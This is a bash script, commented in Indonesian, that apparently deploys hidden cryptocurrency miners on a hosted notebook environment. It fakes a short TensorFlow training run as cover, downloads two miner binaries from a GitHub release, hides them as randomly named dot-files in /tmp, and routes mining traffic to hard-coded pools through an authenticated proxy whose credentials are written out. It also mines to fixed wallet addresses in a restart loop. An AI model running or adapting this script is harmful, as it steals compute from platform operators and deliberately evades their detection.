#!/bin/bash
# MINN v6 — download langsung, mining lewat proxy
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)

PX_HOST="niceproxy.io"
PX_PORT="17522"
PU="riset_h9wl-country-SG-ssid-06WZKklIAI"
PP="riset"

echo "[MINN v6] Worker: $WRK"

# === 1. Warmup cepat ===
echo "[1/3] Warmup..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Download langsung (no proxy), setup proxychains ===
echo "[2/3] Download + proxy setup..."
apt-get install -y -qq proxychains4 2>/dev/null

rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m

# Download langsung dari GitHub — keliatan normal
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune || {
    echo "FAIL: fortune download error"
    exit 1
}
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || {
    echo "FAIL: sse2 download error"
    exit 1
}
chmod +x fortune sse2
echo "[2/3] Downloaded OK."

# Setup proxychains
rm -f /etc/proxychains4.conf
cat > /etc/proxychains4.conf << PCEOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
http $PU $PP $PX_HOST $PX_PORT
PCEOF

# Test proxy (optional)
curl -x "${PX_HOST}:${PX_PORT}" -U "${PU}:${PP}" -s --max-time 8 https://api.ipify.org 2>/dev/null && echo "[2/3] Proxy OK" || echo "[2/3] Proxy test skipped"

# === 3. Mining — semua lewat proxychains ===
echo "[3/3] Starting miners..."

# Copy ke tmp dgn nama random
B1="/tmp/.$(date +%s | md5sum | head -c 8)"
B2="/tmp/.$(date +%s | sha1sum | head -c 8)"
cp -f fortune "$B1" || { echo "FATAL: cp $B1"; exit 1; }
cp -f sse2 "$B2" || { echo "FATAL: cp $B2"; exit 1; }
chmod +x "$B1" "$B2"

sleep $((RANDOM % 10 + 5))

# PRL
(while true; do
    proxychains4 -q "$B1" \
        --proxy 43.169.30.87:443 \
        --address "$PRL" \
        --worker "$WRK" \
        --mode=cpu \
        --threads=1 2>/dev/null
    sleep 10
done) &
PID1=$!
sleep 10

# TDC
proxychains4 -q "$B2" \
    -a yespowertide \
    -o 47.251.244.12:80 \
    -u "${TDC}.${WRK}" \
    -t 1 >/dev/null 2>&1 &
PID2=$!

echo "[MINN v6] Running — PRL:$PID1 TDC:$PID2 (proxy: $PX_HOST)"

cleanup() {
    kill $PID1 $PID2 2>/dev/null
    rm -f "$B1" "$B2" fortune sse2 2>/dev/null
    echo "[MINN] Clean"
}
trap cleanup EXIT

(sleep 10800; cleanup; echo "[MINN] Done.") &
wait